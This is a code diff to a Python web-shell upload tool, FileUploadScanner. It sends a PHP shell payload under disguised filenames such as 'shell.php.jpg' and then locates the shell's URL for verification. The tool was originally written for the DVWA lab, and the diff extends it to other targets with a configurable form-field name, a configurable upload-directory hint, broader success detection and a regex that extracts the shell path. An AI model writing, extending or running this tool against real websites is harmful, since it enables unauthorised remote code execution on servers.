@@ -16,16 +16,24 @@ class FileUploadScanner:
         "shell.php.jpg",
     ]
 
-    def __init__(self, session, base_url="http://127.0.0.1"):
+    def __init__(self, session, base_url="http://127.0.0.1", config=None,
+                 file_field="uploaded", upload_dir_hint="hackable/uploads"):
         self.session = session
         self.base_url = base_url.rstrip("/")
         self.findings = []
         self.shell_url = None
+        # file_field: the form's file-input name (DVWA uses "uploaded";
+        # other targets commonly use "file", "avatar", "attachment", etc.)
+        self.file_field = file_field
+        # upload_dir_hint: a known/likely path where uploads are served
+        # from, used as a fallback when the response doesn't explicitly
+        # say where the file landed
+        self.upload_dir_hint = upload_dir_hint.strip("/")
 
     def attempt_upload(self, upload_url, filename):
         print(f"{Fore.BLUE}[*] Attempting upload: {filename}")
         files = {
-            "uploaded": (
+            self.file_field: (
                 filename,
                 io.BytesIO(self.SHELL_PAYLOAD.encode()),
                 "application/x-php"
@@ -42,20 +50,45 @@ class FileUploadScanner:
     def check_upload_success(self, resp, filename):
         if not resp:
             return None
+
+        body = resp.text
+
+        # 1. Best signal: the response contains a path ending in our
+        # exact filename (or a renamed variant) — this works regardless
+        # of what directory structure the target uses
+        path_match = re.search(
+            r'([\w./-]*' + re.escape(filename.rsplit(".", 1)[0]) + r'[\w.]*\.(?:php\w*|phtml|pHp))',
+            body, re.IGNORECASE
+        )
+        if path_match:
+            found_path = path_match.group(1).lstrip("./")
+            shell_url = f"{self.base_url}/{found_path}"
+            print(f"{Fore.GREEN}[+] Upload succeeded: {shell_url}")
+            return shell_url
+
+        # 2. Generic success keywords, combined with the configured
+        # upload_dir_hint as the best guess for where the file landed
         success_patterns = [
             r'succesfully uploaded',
             r'successfully uploaded',
-            r'hackable/uploads',
+            r'upload(ed)? (was )?success',
+            r'file (was )?saved',
+            r'file (was )?stored',
         ]
         for pattern in success_patterns:
-            if re.search(pattern, resp.text, re.IGNORECASE):
-                path_match = re.search(r'hackable/uploads/([^\s<"\']+)', resp.text)
-                uploaded_name = path_match.group(1) if path_match else filename
-                shell_url = f"{self.base_url}/hackable/uploads/{uploaded_name}"
-                print(f"{Fore.GREEN}[+] Upload succeeded: {shell_url}")
+            if re.search(pattern, body, re.IGNORECASE):
+                shell_url = f"{self.base_url}/{self.upload_dir_hint}/{filename}"
+                print(f"{Fore.GREEN}[+] Upload appears successful (keyword match) — "
+                      f"guessing path: {shell_url}")
+                print(f"{Fore.YELLOW}    (path is a guess based on upload_dir_hint — "
+                      f"verify manually if shell doesn't respond)")
                 return shell_url
-        if "Your image was not uploaded" in resp.text:
+
+        # 3. Known rejection message (DVWA-specific, kept as a fast
+        # negative-path signal, not required for success detection)
+        if "Your image was not uploaded" in body:
             print(f"{Fore.YELLOW}[!] Upload rejected for: {filename}")
+
         return None
 
     def verify_shell(self, shell_url):
